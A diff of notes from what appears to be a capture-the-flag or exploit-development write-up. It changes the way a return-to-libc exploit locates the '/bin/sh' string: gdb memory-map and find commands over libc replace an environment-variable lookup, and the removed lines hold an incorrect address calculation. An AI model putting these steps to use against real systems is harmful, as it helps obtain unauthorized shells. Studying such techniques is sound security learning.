@@ -71,15 +71,17 @@ info functions system
 info functions exit
 0xf7e5eb70  exit
 
-to find /bin/sh we need to print the env variables and search for the SHELL one
+to find /bin/sh we need to print the list of mapped memory regions.
 
-x/s 500 $esp
+info proc map
 
-(gdb) x/s 0xffffd8c2
-0xffffd8c2:	 "SHELL=/bin/bash"
+0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
 
-once found the address we add 6 to remove the "SHELL="
-0xffffd8c2 + 6 = 0xf7f897ec
+in the libc we search for "/bin/sh" using find
+
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
 
 (gdb) x/s 0xf7f897ec
 0xf7f897ec:	 "/bin/sh"
